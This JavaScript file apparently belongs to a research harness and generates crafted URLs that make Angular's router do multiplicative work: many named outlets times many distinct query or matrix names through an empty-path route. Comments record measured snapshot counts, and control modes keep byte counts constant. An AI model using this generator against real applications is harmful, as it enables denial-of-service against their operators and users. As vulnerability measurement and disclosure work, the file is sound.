// One request URL, two attacker-chosen dimensions, and a route depth the
// application already has:
//
//   auxiliary outlets  x  distinct query names  x  empty-path depth
//
// Recognition walks every outlet the URL declares, an empty-path route matches
// each of them without consuming a segment, and every snapshot it builds copies
// the whole query map. The URL pays for the outlets and the names once each;
// the Router pays for their product.
//
// Nothing here is numeric, so this is not the V8 indexed-elements family that
// PR #70717 fixed.
const ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

// Shortest distinct ASCII spellings: 52 one-letter, then two, then three.
function keyAt(index) {
  const n = ALPHABET.length;
  if (index < n) return ALPHABET[index];
  let rest = index - n;
  if (rest < n * n) return ALPHABET[(rest / n) | 0] + ALPHABET[rest % n];
  rest -= n * n;
  return (
    ALPHABET[(rest / (n * n)) | 0] + ALPHABET[((rest / n) | 0) % n] + ALPHABET[rest % n]
  );
}

// "name:/()" is a named outlet holding an empty primary child group, and the
// four characters after the name are all load-bearing. Measured against the
// installed @angular/router with ROUTER_PATCH=count, 100 outlets:
//
//   name:/()   406 snapshots   the published spelling, 6 + 4*O
//   name:/      12 snapshots   parses to one child per outlet, and fans out for none
//   name:z      12 snapshots   same
//   name:()     fails to parse (NG04010)
//   name:        2 children for 4 outlets; the parser folds them into one group
//
// So a cheaper spelling is not available. ":/" and ":z" do give DefaultUrlSerializer
// one child per outlet, which looks like a 2-byte-per-outlet saving until you count
// snapshots: the empty "()" child group is what lets the empty-path route match an
// outlet while consuming nothing, and without it recognition never fans out.
function outlets(count) {
  return Array.from(
    { length: count },
    (_, index) => `${index && !process.env["NO_SEP"] ? "//" : ""}${keyAt(index)}:/()`,
  ).join("");
}

// The control keeps every byte, every outlet and every query pair, and changes
// only how many distinct names the query map ends up with: every name becomes a
// run of "a" of its own length, so "b" becomes "a" and "cd" becomes "aa". Same
// bytes, same pair count, one distinct name per length. The Router parses the
// same pairs and retains the same values either way.
export function buildTarget({ shape, mode, outletCount, queryNames, matrixNames = 0 }) {
  const names = Array.from({ length: queryNames }, (_, index) => keyAt(index));
  const query =
    mode === "control"
      ? names.map((name) => "a".repeat(name.length))
      : names;

  // A dimension set to zero contributes none of its own syntax: no empty "()"
  // group and no bare "?". That keeps each single-dimension arm at the bytes of
  // its own dimension alone.
  // Matrix parameters ride on the first segment, so the parent snapshot owns a
  // wide params map that every empty-path child inherits by copying.
  // MATRIX_CLIFF repeats the last name, so the request keeps every byte and every
  // parsed entry but the map ends up with one fewer own property. That is the
  // control for the V8 dictionary-capacity step, not for the byte count.
  const cliff = process.env["MATRIX_CLIFF"] ? 1 : 0;
  const matrix = Array.from({ length: matrixNames }, (_, index) =>
    mode === "control"
      ? `;${"a".repeat(keyAt(index).length)}`
      : `;${keyAt(index === matrixNames - 1 ? index - cliff : index)}`,
  ).join("");
  const segment = `/${shape}${matrix}`;
  const path = outletCount ? `${segment}/(${outlets(outletCount)})` : segment;
  return queryNames ? `${path}?${query.join("&")}` : path;
}
